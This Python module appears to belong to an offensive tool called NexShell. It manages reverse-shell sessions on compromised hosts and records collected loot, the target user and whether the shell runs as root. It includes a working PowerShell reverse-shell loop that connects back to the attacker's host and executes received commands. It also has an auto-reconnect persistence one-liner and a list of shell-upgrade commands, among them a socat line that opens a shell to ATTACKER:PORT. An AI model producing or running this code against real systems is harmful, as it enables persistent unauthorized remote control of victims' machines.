#!/usr/bin/env python3
"""
NexShell — Session Manager
Auto-reconnect, session keepalive, snapshot (save/restore state),
session health monitoring, and cross-platform terminal size sync.
"""

import os
import json
import time
import threading
import datetime
import platform
from typing import Optional, Dict, Any

IS_WINDOWS = os.name == 'nt'

if not IS_WINDOWS:
    import signal

# ── SQLite backend (lazy import — stays optional) ───────────────────────────
try:
    from db import get_db as _get_db
    _DB_AVAILABLE = True
except ImportError:
    _get_db      = None  # type: ignore
    _DB_AVAILABLE = False


# ══════════════════════════════════════════════════════════════════════════════
#  SESSION SNAPSHOT  — save/restore session state
# ══════════════════════════════════════════════════════════════════════════════

class SessionSnapshot:
    """
    Persists session context between reconnections:
    - Working directory
    - Collected loot summary
    - Custom tags and notes
    - Environment variables gathered
    - Shell type and OS
    """

    SNAP_DIR = os.path.expanduser('~/.nexshell/snapshots')

    def __init__(self, session_id: int, host: str):
        self.session_id  = session_id
        self.host        = host
        self.created_at  = datetime.datetime.utcnow().isoformat()
        self.state: Dict[str, Any] = {
            'session_id':  session_id,
            'host':        host,
            'cwd':         '~',
            'os':          'Unknown',
            'shell_type':  'unknown',
            'user':        '',
            'is_root':     False,
            'tag':         '',
            'notes':       [],
            'env':         {},
            'loot_count':  0,
            'commands':    [],   # last N commands for context
        }
        os.makedirs(self.SNAP_DIR, exist_ok=True)

    # ── State updates ─────────────────────────────────────────────────────────
    def update(self, **kwargs):
        self.state.update(kwargs)
        return self

    def add_note(self, note: str):
        self.state['notes'].append({'ts': datetime.datetime.utcnow().isoformat(), 'text': note})
        # Persist to DB
        if _DB_AVAILABLE and _get_db:
            try:
                _get_db().add_note(self.session_id, note)
            except Exception:
                pass

    def add_command(self, cmd: str, max_history: int = 50, output: str = ''):
        self.state['commands'].append(cmd)
        if len(self.state['commands']) > max_history:
            self.state['commands'] = self.state['commands'][-max_history:]
        # Persist to command_history DB table
        if _DB_AVAILABLE and _get_db:
            try:
                _get_db().add_history(self.session_id, cmd, output)
            except Exception:
                pass

    # ── Persistence ───────────────────────────────────────────────────────────
    @property
    def _path(self) -> str:
        safe = self.host.replace('.', '_').replace(':', '_')
        return os.path.join(self.SNAP_DIR, f'session_{safe}_{self.session_id}.json')

    def save(self) -> str:
        """Persist snapshot to JSON file AND to SQLite DB."""
        self.state['saved_at'] = datetime.datetime.utcnow().isoformat()
        # 1) JSON file (legacy / backup)
        with open(self._path, 'w') as f:
            json.dump(self.state, f, indent=2)
        # 2) SQLite (primary persistent store)
        if _DB_AVAILABLE and _get_db:
            try:
                db = _get_db()
                db.update_session(
                    self.session_id,
                    os=self.state.get('os', 'Unknown'),
                    user=self.state.get('user', ''),
                    is_root=int(self.state.get('is_root', False)),
                    shell_type=self.state.get('shell_type', 'dumb'),
                    tag=self.state.get('tag', ''),
                )
            except Exception:
                pass  # never crash on DB failure
        return self._path

    @classmethod
    def load(cls, path: str) -> Optional['SessionSnapshot']:
        try:
            with open(path) as f:
                data = json.load(f)
            snap = cls(data.get('session_id', 0), data.get('host', ''))
            snap.state = data
            return snap
        except Exception:
            return None

    @classmethod
    def load_from_db(cls, session_id: int) -> Optional['SessionSnapshot']:
        """Restore a SessionSnapshot from the SQLite DB."""
        if not (_DB_AVAILABLE and _get_db):
            return None
        try:
            row = _get_db().get_session(session_id)
            if not row:
                return None
            snap = cls(session_id, row['host'])
            snap.state.update({
                'host':       row['host'],
                'os':         row.get('os', 'Unknown'),
                'user':       row.get('user', ''),
                'is_root':    bool(row.get('is_root', 0)),
                'shell_type': row.get('shell_type', 'dumb'),
                'tag':        row.get('tag', ''),
            })
            # Restore notes from DB
            snap.state['notes'] = [
                {'ts': n['ts'], 'text': n['text']}
                for n in _get_db().get_notes(session_id)
            ]
            # Restore last N commands from DB
            snap.state['commands'] = [
                h['command'] for h in _get_db().get_history(session_id, limit=50)
            ]
            return snap
        except Exception:
            return None

    @classmethod
    def db_sessions(cls, status: Optional[str] = None):
        """List sessions from DB. Returns list of dicts."""
        if not (_DB_AVAILABLE and _get_db):
            return []
        try:
            return _get_db().list_sessions(status=status)
        except Exception:
            return []

    @classmethod
    def latest_for_host(cls, host: str) -> Optional['SessionSnapshot']:
        """Find the most recent snapshot for a given host."""
        safe = host.replace('.', '_').replace(':', '_')
        pattern = os.path.join(cls.SNAP_DIR, f'session_{safe}_*.json')
        import glob
        files = sorted(glob.glob(pattern))
        if not files:
            return None
        return cls.load(files[-1])

    def summary(self) -> str:
        s = self.state
        lines = [
            f"  Session Snapshot — {s['host']}",
            f"  OS: {s['os']}  User: {s['user']}  Root: {'YES' if s['is_root'] else 'no'}",
            f"  Shell: {s['shell_type']}  CWD: {s['cwd']}",
        ]
        if s.get('tag'):
            lines.append(f"  Tag: {s['tag']}")
        if s.get('notes'):
            lines.append(f"  Notes ({len(s['notes'])}):")
            for n in s['notes'][-3:]:
                lines.append(f"    - {n['text']}")
        if s.get('loot_count'):
            lines.append(f"  Loot items: {s['loot_count']}")
        return '\n'.join(lines)


# ══════════════════════════════════════════════════════════════════════════════
#  SESSION HEALTH MONITOR
# ══════════════════════════════════════════════════════════════════════════════

class SessionHealthMonitor:
    """
    Sends periodic heartbeats to detect dead sessions.
    OS-adaptive: uses different no-op commands per platform.
    """

    HEARTBEAT_LINUX   = b' \x08'    # space + backspace — invisible
    HEARTBEAT_WINDOWS = b''          # empty — avoids any echo

    def __init__(self, send_fn, recv_check_fn, interval_s: int = 30,
                 on_dead=None, os_type: str = 'linux'):
        self._send       = send_fn
        self._alive_check = recv_check_fn
        self._interval   = interval_s
        self._on_dead    = on_dead
        self._os         = os_type
        self._stop       = threading.Event()
        self._last_seen  = time.time()
        self._missed     = 0
        self._max_missed = 3
        self._thread     = threading.Thread(target=self._loop, daemon=True, name='nxsh-heartbeat')

    def start(self):
        self._thread.start()
        return self

    def stop(self):
        self._stop.set()

    def record_activity(self):
        """Call when data is received from session."""
        self._last_seen = time.time()
        self._missed    = 0

    def _loop(self):
        while not self._stop.wait(self._interval):
            try:
                hb = self.HEARTBEAT_WINDOWS if self._os == 'Windows' else self.HEARTBEAT_LINUX
                if hb:
                    self._send(hb)
                # Check if session responded recently
                if time.time() - self._last_seen > self._interval * (self._max_missed + 1):
                    self._missed += 1
                    if self._missed >= self._max_missed and self._on_dead:
                        self._on_dead()
                        break
            except Exception:
                break


# ══════════════════════════════════════════════════════════════════════════════
#  AUTO-RECONNECT MANAGER
# ══════════════════════════════════════════════════════════════════════════════

class AutoReconnect:
    """
    Automatically maintains a reverse shell connection.
    When a session dies, schedules reconnect via the active persistence mechanism.
    """

    def __init__(self, host: str, port: int, listener_start_fn,
                 interval_s: int = 30, max_attempts: int = 10):
        self.host          = host
        self.port          = port
        self._start_listener = listener_start_fn
        self.interval      = interval_s
        self.max_attempts  = max_attempts
        self._attempt      = 0
        self._stop         = threading.Event()
        self._thread       = threading.Thread(target=self._loop, daemon=True, name='nxsh-reconnect')
        self.on_reconnect  = None   # callback when session re-established

    def start(self):
        self._thread.start()
        return self

    def stop(self):
        self._stop.set()

    def _loop(self):
        while not self._stop.wait(self.interval):
            if self._attempt >= self.max_attempts:
                break
            self._attempt += 1
            try:
                self._start_listener(self.port)
                if self.on_reconnect:
                    self.on_reconnect(self._attempt)
            except Exception:
                pass

    def reconnect_payload(self, persist_cmd: str) -> str:
        """Return a one-liner that keeps reconnecting every N seconds."""
        return (
            f"while true; do {persist_cmd}; sleep {self.interval}; done &"
        )

    @staticmethod
    def windows_reconnect_ps(host: str, port: int, interval_s: int = 30) -> str:
        """PowerShell auto-reconnect loop."""
        return (
            f"while($true){{"
            f"try{{$c=New-Object Net.Sockets.TCPClient('{host}',{port});"
            f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
            f"while(($i=$s.Read($b,0,$b.Length))-ne 0){{"
            f"$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
            f"$r=(iex $d 2>&1|Out-String);"
            f"$sb=([Text.Encoding]::ASCII).GetBytes($r);"
            f"$s.Write($sb,0,$sb.Length)}};$c.Close()}}"
            f"catch{{}};"
            f"Start-Sleep {interval_s}}}"
        )


# ══════════════════════════════════════════════════════════════════════════════
#  TERMINAL SIZE SYNC  (SIGWINCH cross-platform)
# ══════════════════════════════════════════════════════════════════════════════

class TerminalSizeSync:
    """
    Synchronize terminal window size between attacker and target.
    Handles SIGWINCH on Unix; polls on Windows.
    """

    def __init__(self, send_resize_fn):
        self._send = send_resize_fn
        self._rows, self._cols = self._get_size()
        self._stop = threading.Event()

    @staticmethod
    def _get_size():
        try:
            import shutil
            s = shutil.get_terminal_size((80, 24))
            return s.lines, s.columns
        except Exception:
            return 24, 80

    def _resize_stty(self):
        rows, cols = self._get_size()
        if (rows, cols) != (self._rows, self._cols):
            self._rows, self._cols = rows, cols
            self._send(f'stty rows {rows} cols {cols}\n'.encode())

    def _resize_ps(self):
        rows, cols = self._get_size()
        if (rows, cols) != (self._rows, self._cols):
            self._rows, self._cols = rows, cols
            # Windows ConPtyShell resize via mode command
            self._send(f'mode con: cols={cols} lines={rows}\r\n'.encode())

    def start_unix(self):
        """Install SIGWINCH handler (Unix only)."""
        if IS_WINDOWS:
            return self.start_polling()
        try:
            import signal
            signal.signal(signal.SIGWINCH, lambda *_: self._resize_stty())
        except (ImportError, AttributeError):
            self.start_polling()
        return self

    def start_polling(self, interval: float = 1.0):
        """Poll terminal size in a background thread (Windows fallback)."""
        def _poll():
            while not self._stop.wait(interval):
                self._resize_stty()
        t = threading.Thread(target=_poll, daemon=True, name='nxsh-winsize')
        t.start()
        return self

    def stop(self):
        self._stop.set()

    @property
    def stty_init(self) -> str:
        """One-liner to initialize stty on Linux target."""
        return (
            f"export TERM=xterm-256color; "
            f"stty rows {self._rows} cols {self._cols}; "
            f"export SHELL=/bin/bash"
        )

    @property
    def ps_init(self) -> str:
        """PowerShell window size initialization."""
        return f"mode con: cols={self._cols} lines={self._rows}"

    @property
    def size(self):
        return self._rows, self._cols


# ══════════════════════════════════════════════════════════════════════════════
#  PTY UPGRADE ADVISOR  — best method per OS/shell
# ══════════════════════════════════════════════════════════════════════════════

PTY_METHODS_LINUX = [
    ("python3",  "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"),
    ("python2",  "python -c 'import pty; pty.spawn(\"/bin/bash\")'"),
    ("script",   "script -q /dev/null /bin/bash"),
    ("perl",     "perl -e 'exec \"/bin/bash\"'"),
    ("expect",   "expect -c 'spawn /bin/bash; interact'"),
    ("socat",    "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER:PORT"),
]

PTY_METHODS_WINDOWS = [
    ("conptyshell", "Invoke-ConPtyShell (full PTY via WebClient download)"),
    ("powershell",  "powershell -ep bypass (basic interactive)"),
    ("cmd",         "cmd.exe /K (basic cmd shell)"),
]

STTY_SEQUENCE = [
    "export TERM=xterm-256color",
    "export SHELL=/bin/bash",
    "stty rows {rows} cols {cols}",
    "stty sane",
]

def get_upgrade_sequence(rows: int = 24, cols: int = 80,
                          os_type: str = 'linux') -> list:
    """Return ordered upgrade commands for the given target OS."""
    if os_type == 'Windows':
        return [m[1] for m in PTY_METHODS_WINDOWS]
    seq = [PTY_METHODS_LINUX[0][1]]
    seq += [s.format(rows=rows, cols=cols) for s in STTY_SEQUENCE]
    return seq
